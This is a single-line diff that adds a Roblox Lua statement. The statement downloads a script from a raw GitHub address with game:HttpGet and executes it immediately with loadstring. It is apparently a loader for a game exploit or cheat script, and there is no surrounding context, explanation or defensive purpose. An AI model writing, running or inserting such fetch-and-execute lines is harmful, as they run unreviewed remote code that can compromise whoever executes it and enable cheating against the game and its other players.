@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mikeexc/9876/main/Mikeexc'))()
